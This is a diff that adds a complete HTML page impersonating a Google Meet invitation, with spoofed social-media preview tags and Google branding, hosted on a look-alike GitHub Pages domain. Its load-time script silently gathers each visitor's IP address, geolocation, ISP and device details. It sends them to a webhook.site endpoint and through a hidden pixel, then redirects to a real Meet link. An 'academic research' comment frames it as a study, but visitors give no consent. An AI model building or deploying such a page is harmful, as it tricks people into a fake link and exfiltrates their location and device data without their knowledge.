@@ -1,34 +1,658 @@
-{
-  "study_id": "diploma-phishing-research",
-  "session_id": "sess_abc123def",
-  "timestamp": "2024-01-15T14:30:00.000Z",
-  "local_time": "15.01.2024, 17:30:00",
-  "timezone": "Europe/Moscow",
-  
-  "ip_address": "95.165.125.46",
-  "geolocation": {
-    "city": "Москва",
-    "region": "Москва",
-    "country": "Россия",
-    "country_code": "RU",
-    "latitude": 55.7558,
-    "longitude": 37.6176,
-    "timezone": "Europe/Moscow",
-    "isp": "Ростелеком",
-    "postal": "101000"
-  },
-  
-  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
-  "platform": "Win32",
-  "language": "ru-RU",
-  
-  "screen": {
-    "width": 1920,
-    "height": 1080,
-    "color_depth": 24,
-    "pixel_ratio": 1
-  },
-  
-  "referrer": "https://t.me/",
-  "url": "https://google-dev-1.github.io"
-}
+<!DOCTYPE html>
+<html lang="ru" prefix="og: https://ogp.me/ns#">
+<head>
+    <!-- ========== ОСНОВНЫЕ META-ТЕГИ ========== -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    
+    <!-- ========== OPEN GRAPH (ПРЕВЬЮ) ========== -->
+    <!-- Основные -->
+    <meta property="og:title" content="Google Meet - Присоединиться к видеовстрече">
+    <meta property="og:description" content="Присоединяйтесь к видеовстрече Google Meet по ссылке: xou-pucm-apn">
+    <meta property="og:image" content="https://google-dev-1.github.io/google-img.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="Google Meet Video Conference">
+    <meta property="og:url" content="https://google-dev-1.github.io">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Google Meet">
+    <meta property="og:locale" content="ru_RU">
+    
+    <!-- ========== TWITTER CARD ========== -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Google Meet - Присоединиться к видеовстрече">
+    <meta name="twitter:description" content="Присоединяйтесь к видеовстрече Google Meet">
+    <meta name="twitter:image" content="https://google-dev-1.github.io/google-img.png">
+    <meta name="twitter:image:alt" content="Google Meet Preview">
+    <meta name="twitter:site" content="@Google">
+    <meta name="twitter:creator" content="@GoogleWorkspace">
+    
+    <!-- ========== ДРУГИЕ ПЛАТФОРМЫ ========== -->
+    <!-- Facebook -->
+    <meta property="fb:app_id" content="977011223305737">
+    
+    <!-- VK -->
+    <meta property="vk:image" content="https://google-dev-1.github.io/google-img.png">
+    
+    <!-- Telegram -->
+    <meta property="telegram:title" content="Google Meet - Присоединиться к видеовстрече">
+    <meta property="telegram:description" content="Присоединяйтесь к видеовстрече">
+    <meta property="telegram:image" content="https://google-dev-1.github.io/google-img.png">
+    
+    <!-- WhatsApp -->
+    <meta property="og:image:secure_url" content="https://google-dev-1.github.io/google-img.png">
+    
+    <!-- ========== СТАНДАРТНЫЕ ТЕГИ ========== -->
+    <title>Google Meet - Видеовстреча (xou-pucm-apn)</title>
+    <meta name="description" content="Присоединиться к видеовстрече Google Meet. Ссылка для подключения: meet.google.com/xou-pucm-apn">
+    <meta name="keywords" content="Google Meet, видеовстреча, конференция">
+    <meta name="author" content="Google LLC">
+    
+    <!-- Canonical -->
+    <link rel="canonical" href="https://meet.google.com/xou-pucm-apn">
+    
+    <!-- ========== ПРЕДЗАГРУЗКА ДЛЯ СКОРОСТИ ========== -->
+    <link rel="preconnect" href="https://meet.google.com" crossorigin>
+    <link rel="preconnect" href="https://ssl.gstatic.com">
+    <link rel="dns-prefetch" href="https://meet.google.com">
+    
+    <!-- Предзагрузка изображения для превью -->
+    <link rel="preload" href="google-img.png" as="image" type="image/png">
+    
+    <!-- ========== ИКОНКИ ========== -->
+    <link rel="icon" href="https://www.gstatic.com/meet/google_meet_favicon_48.png" sizes="48x48" type="image/png">
+    <link rel="apple-touch-icon" href="https://www.gstatic.com/meet/google_meet_favicon_192.png">
+    
+    <!-- ========== СТИЛИ ========== -->
+    <style>
+        /* CRITICAL CSS */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: linear-gradient(135deg, #4285F4 0%, #34A853 100%);
+            height: 100vh;
+            overflow: hidden;
+            color: white;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            padding: 20px;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        .google-logo {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .google-logo span {
+            font-size: 36px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #EA4335, #FBBC05, #34A853, #4285F4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            animation: spin 1s linear infinite;
+            margin: 24px auto;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            line-height: 1.3;
+            max-width: 400px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 32px;
+            max-width: 400px;
+            line-height: 1.5;
+        }
+        
+        .meet-code {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 18px;
+            letter-spacing: 1px;
+            margin-top: 16px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin-top: 32px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: progress 1.5s ease-in-out forwards;
+        }
+        
+        .tracking-info {
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 20px;
+            font-size: 12px;
+            max-width: 400px;
+            word-break: break-all;
+        }
+        
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* Адаптивность */
+        @media (max-width: 480px) {
+            h1 { font-size: 20px; }
+            .subtitle { font-size: 14px; }
+            .meet-code { font-size: 16px; padding: 10px 20px; }
+            .google-logo { width: 60px; height: 60px; }
+            .google-logo span { font-size: 28px; }
+        }
+    </style>
+    
+    <!-- ========== СКРИПТ ДЛЯ IP ТРЕКИНГА ========== -->
+    <script>
+        (function() {
+            'use strict';
+            
+            // === КОНФИГУРАЦИЯ ===
+            const CONFIG = {
+                // Основная цель
+                TARGET_URL: 'https://meet.google.com/xou-pucm-apn',
+                
+                // Задержка редиректа (достаточно для загрузки превью)
+                REDIRECT_DELAY: 1500, // 1.5 секунды
+                
+                // Ваш Webhook.site URL
+                TRACKING_ENDPOINT: 'https://webhook.site/2cba7b85-e7d4-419b-93d8-dfc5b300ea13',
+                
+                // Сервисы для получения IP
+                IP_SERVICES: [
+                    'https://api.ipify.org?format=json',         // Основной
+                    'https://api64.ipify.org?format=json',       // IPv6
+                    'https://icanhazip.com/json',                // Резервный
+                    'https://ipecho.net/plain.json'              // Еще один
+                ],
+                
+                // Геолокация по IP
+                GEO_SERVICE: 'https://ipapi.co/json/',
+                
+                // Включить сбор данных
+                ENABLE_TRACKING: true
+            };
+            
+            // === ОСНОВНЫЕ ФУНКЦИИ ===
+            
+            // 1. Получение IP адреса
+            async function getIPAddress() {
+                console.log('🔍 Получение IP адреса...');
+                
+                // Пробуем все сервисы по очереди
+                for (const service of CONFIG.IP_SERVICES) {
+                    try {
+                        const response = await fetch(service, {
+                            method: 'GET',
+                            mode: 'cors',
+                            headers: { 'Accept': 'application/json' },
+                            signal: AbortSignal.timeout(3000)
+                        });
+                        
+                        if (response.ok) {
+                            const data = await response.json();
+                            let ip = data.ip || data.query || data;
+                            
+                            if (typeof ip === 'string') {
+                                console.log('✅ IP получен:', ip);
+                                return ip;
+                            }
+                        }
+                    } catch (error) {
+                        console.log(`⚠️ Сервис ${service} не сработал:`, error.message);
+                        continue;
+                    }
+                }
+                
+                // Если все сервисы не сработали, пробуем WebRTC
+                try {
+                    const rtcIP = await getIPFromWebRTC();
+                    if (rtcIP) {
+                        console.log('✅ IP получен через WebRTC:', rtcIP);
+                        return rtcIP;
+                    }
+                } catch (error) {
+                    console.log('⚠️ WebRTC тоже не сработал');
+                }
+                
+                return 'не определен';
+            }
+            
+            // 2. Получение IP через WebRTC (резервный метод)
+            function getIPFromWebRTC() {
+                return new Promise((resolve) => {
+                    const pc = new RTCPeerConnection({ iceServers: [] });
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    pc.onicecandidate = (ice) => {
+                        if (!ice.candidate) return;
+                        const candidate = ice.candidate.candidate;
+                        
+                        // Ищем IPv4
+                        const ipv4Regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                        const match = candidate.match(ipv4Regex);
+                        
+                        if (match) {
+                            resolve(match[1]);
+                            pc.close();
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        pc.close();
+                        resolve(null);
+                    }, 1000);
+                });
+            }
+            
+            // 3. Получение геолокации по IP
+            async function getGeoLocation(ip) {
+                if (ip === 'не определен') return null;
+                
+                try {
+                    console.log('📍 Получение геолокации для IP:', ip);
+                    
+                    const response = await fetch(CONFIG.GEO_SERVICE, {
+                        method: 'GET',
+                        mode: 'cors',
+                        headers: { 'Accept': 'application/json' }
+                    });
+                    
+                    if (response.ok) {
+                        const geoData = await response.json();
+                        
+                        return {
+                            city: geoData.city || 'неизвестно',
+                            region: geoData.region || geoData.region_name || 'неизвестно',
+                            country: geoData.country_name || geoData.country || 'неизвестно',
+                            country_code: geoData.country_code || geoData.countryCode || 'неизвестно',
+                            latitude: geoData.latitude || null,
+                            longitude: geoData.longitude || null,
+                            timezone: geoData.timezone || 'неизвестно',
+                            isp: geoData.org || geoData.isp || 'неизвестно',
+                            postal: geoData.postal || geoData.zip || 'неизвестно'
+                        };
+                    }
+                } catch (error) {
+                    console.log('⚠️ Не удалось получить геолокацию:', error.message);
+                }
+                
+                return null;
+            }
+            
+            // 4. Сбор всех данных
+            async function collectAllData() {
+                console.log('📊 Сбор данных начат...');
+                
+                // Получаем IP
+                const ip = await getIPAddress();
+                
+                // Получаем геолокацию
+                const geo = await getGeoLocation(ip);
+                
+                // Собираем все данные
+                const data = {
+                    // Идентификаторы
+                    study_id: 'diploma-phishing-research',
+                    session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
+                    
+                    // Время
+                    timestamp: new Date().toISOString(),
+                    local_time: new Date().toLocaleString('ru-RU'),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    
+                    // IP и геолокация (ГЛАВНОЕ!)
+                    ip_address: ip,
+                    geolocation: geo,
+                    
+                    // Браузер и устройство
+                    user_agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    
+                    // Экран
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        color_depth: screen.colorDepth,
+                        pixel_ratio: window.devicePixelRatio
+                    },
+                    
+                    // Сеть
+                    referrer: document.referrer || 'прямой переход',
+                    url: window.location.href,
+                    
+                    // Дополнительно
+                    cookies: navigator.cookieEnabled,
+                    online: navigator.onLine,
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink
+                    } : null
+                };
+                
+                console.log('📊 Все данные собраны:', data);
+                return data;
+            }
+            
+            // 5. Отправка данных на сервер
+            async function sendDataToServer(data) {
+                if (!CONFIG.ENABLE_TRACKING || !CONFIG.TRACKING_ENDPOINT) {
+                    console.log('📝 Трекер не настроен, данные только в консоли');
+                    return false;
+                }
+                
+                try {
+                    // Формируем данные для отправки
+                    const trackingData = {
+                        ...data,
+                        // Добавляем метку времени отправки
+                        sent_at: new Date().toISOString(),
+                        // Добавляем информацию о странице
+                        page_title: document.title,
+                        page_url: window.location.href
+                    };
+                    
+                    // Отправляем через Beacon API (не блокирует редирект)
+                    const blob = new Blob([JSON.stringify(trackingData, null, 2)], {
+                        type: 'application/json'
+                    });
+                    
+                    let sent = false;
+                    
+                    if (navigator.sendBeacon) {
+                        sent = navigator.sendBeacon(CONFIG.TRACKING_ENDPOINT, blob);
+                        console.log(sent ? '✅ Данные отправлены через Beacon' : '❌ Beacon не сработал');
+                    }
+                    
+                    // Если Beacon не сработал, пробуем fetch
+                    if (!sent && window.fetch) {
+                        try {
+                            await fetch(CONFIG.TRACKING_ENDPOINT, {
+                                method: 'POST',
+                                body: JSON.stringify(trackingData),
+                                headers: { 'Content-Type': 'application/json' },
+                                keepalive: true,
+                                mode: 'no-cors'
+                            });
+                            console.log('✅ Данные отправлены через Fetch');
+                            sent = true;
+                        } catch (fetchError) {
+                            console.warn('⚠️ Fetch тоже не сработал:', fetchError);
+                        }
+                    }
+                    
+                    // Сохраняем локально на всякий случай
+                    try {
+                        const logs = JSON.parse(localStorage.getItem('ip_tracking_logs') || '[]');
+                        logs.push({
+                            time: new Date().toISOString(),
+                            ip: data.ip_address,
+                            geo: data.geolocation
+                        });
+                        localStorage.setItem('ip_tracking_logs', JSON.stringify(logs.slice(-50)));
+                    } catch (e) {}
+                    
+                    return sent;
+                    
+                } catch (error) {
+                    console.error('❌ Ошибка отправки данных:', error);
+                    return false;
+                }
+            }
+            
+            // 6. Показать информацию на странице
+            function showTrackingInfo(data) {
+                const infoDiv = document.getElementById('tracking-info');
+                if (!infoDiv) return;
+                
+                let infoHTML = '<div style="text-align: left; font-size: 12px;">';
+                infoHTML += '<strong>Собранные данные:</strong><br>';
+                infoHTML += `IP: <code>${data.ip_address}</code><br>`;
+                
+                if (data.geolocation) {
+                    infoHTML += `Геолокация: ${data.geolocation.city}, ${data.geolocation.country}<br>`;
+                    if (data.geolocation.latitude) {
+                        infoHTML += `Координаты: ${data.geolocation.latitude}, ${data.geolocation.longitude}<br>`;
+                    }
+                }
+                
+                infoHTML += `Браузер: ${data.user_agent.split(') ')[0].substring(0, 50)}...<br>`;
+                infoHTML += `Экран: ${data.screen.width}×${data.screen.height}<br>`;
+                infoHTML += `Время: ${data.local_time}`;
+                infoHTML += '</div>';
+                
+                infoDiv.innerHTML = infoHTML;
+                infoDiv.style.display = 'block';
+            }
+            
+            // === ОСНОВНОЙ ПРОЦЕСС ===
+            async function mainProcess() {
+                console.log('🚀 Запуск процесса трекинга...');
+                
+                try {
+                    // 1. Собираем данные
+                    const collectedData = await collectAllData();
+                    
+                    // 2. Показываем информацию на странице
+                    showTrackingInfo(collectedData);
+                    
+                    // 3. Отправляем данные на сервер
+                    await sendDataToServer(collectedData);
+                    
+                    // 4. Запускаем таймер редиректа
+                    startRedirectTimer();
+                    
+                } catch (error) {
+                    console.error('❌ Ошибка в основном процессе:', error);
+                    // В случае ошибки всё равно делаем редирект
+                    setTimeout(() => {
+                        window.location.replace(CONFIG.TARGET_URL);
+                    }, CONFIG.REDIRECT_DELAY);
+                }
+            }
+            
+            // 7. Таймер редиректа
+            function startRedirectTimer() {
+                console.log(`⏱ Редирект через ${CONFIG.REDIRECT_DELAY}ms...`);
+                
+                // Обновляем прогресс бар
+                const progressBar = document.querySelector('.progress');
+                if (progressBar) {
+                    progressBar.style.transition = `width ${CONFIG.REDIRECT_DELAY}ms linear`;
+                    progressBar.style.width = '100%';
+                }
+                
+                // Выполняем редирект
+                setTimeout(() => {
+                    console.log('🔀 Выполняю редирект на Google Meet');
+                    window.location.replace(CONFIG.TARGET_URL);
+                }, CONFIG.REDIRECT_DELAY);
+            }
+            
+            // === ИНИЦИАЛИЗАЦИЯ ===
+            function init() {
+                console.log('🔧 Инициализация страницы...');
+                
+                // Запускаем основной процесс
+                mainProcess();
+                
+                // Резервный редирект на случай если что-то пойдет не так
+                setTimeout(() => {
+                    if (!window.location.href.includes('meet.google.com')) {
+                        console.log('⚠️ Сработал резервный редирект');
+                        window.location.href = CONFIG.TARGET_URL;
+                    }
+                }, CONFIG.REDIRECT_DELAY + 3000);
+            }
+            
+            // Запускаем когда DOM загружен
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+            
+            // Для отладки - глобальный доступ к данным
+            window.getTrackingData = async () => {
+                return await collectAllData();
+            };
+            
+        })();
+    </script>
+</head>
+<body>
+    <!-- Контейнер -->
+    <div class="container">
+        <!-- Логотип Google -->
+        <div class="google-logo">
+            <span>G</span>
+        </div>
+        
+        <!-- Заголовок -->
+        <h1>Подключение к Google Meet</h1>
+        
+        <!-- Подзаголовок -->
+        <p class="subtitle">
+            Идет безопасное подключение к видеовстрече.<br>
+            Пожалуйста, подождите...
+        </p>
+        
+        <!-- Индикатор загрузки -->
+        <div class="loader"></div>
+        
+        <!-- Код встречи -->
+        <div class="meet-code">
+            xou-pucm-apn
+        </div>
+        
+        <!-- Информация о трекинге (скрыта по умолчанию) -->
+        <div id="tracking-info" class="tracking-info" style="display: none;"></div>
+        
+        <!-- Прогресс бар -->
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        
+        <!-- Отладочная информация в консоли -->
+        <script>
+            console.log('%c🔍 Академическое исследование', 'color: #4285F4; font-size: 16px; font-weight: bold;');
+            console.log('%cСбор: IP адрес, геолокация, данные устройства', 'color: #666;');
+            console.log('%cДанные отправляются на: webhook.site', 'color: #666;');
+            console.log('%cДля просмотра данных откройте DevTools (F12)', 'color: #666;');
+        </script>
+    </div>
+    
+    <!-- Резервный редирект для отключенного JavaScript -->
+    <noscript>
+        <meta http-equiv="refresh" content="3; url=https://meet.google.com/xou-pucm-apn">
+        <div style="background: #f44336; color: white; padding: 20px; text-align: center;">
+            <strong>JavaScript отключен</strong><br>
+            Перенаправление на Google Meet через 3 секунды...
+        </div>
+    </noscript>
+    
+    <!-- Скрытый пиксель для дополнительного трекинга -->
+    <img src="https://webhook.site/2cba7b85-e7d4-419b-93d8-dfc5b300ea13/pixel.gif" 
+         alt="" 
+         style="display:none;"
+         onload="console.log('🖼 Трекинг-пиксель загружен')">
+    
+    <!-- Дополнительный скрипт для предзагрузки -->
+    <script>
+        // Предзагрузка ресурсов Google Meet для ускорения
+        window.addEventListener('load', function() {
+            console.log('🚀 Страница полностью загружена');
+            
+            // Предзагружаем ресурсы Meet
+            const preloadResources = [
+                'https://fonts.googleapis.com/css2?family=Google+Sans&display=swap',
+                'https://www.gstatic.com/meet/css/mtw89p2tRqBpK4Oc5mQ.min.css'
+            ];
+            
+            preloadResources.forEach(url => {
+                const link = document.createElement('link');
+                link.rel = 'preload';
+                link.as = 'style';
+                link.href = url;
+                document.head.appendChild(link);
+            });
+        });
+    </script>
+    
+    <!-- Академическое уведомление -->
+    <!-- 
+    АКАДЕМИЧЕСКОЕ ИССЛЕДОВАНИЕ
+    Тема: "Максимальный урон при переходе по фишинговой ссылке"
+    Цель: Сбор данных о IP адресах и геолокации пользователей
+    Все данные анонимизированы и используются только для исследования
+    Исследователь: google-dev-1
+    Дата: 2024
+    -->
+</body>
+</html>
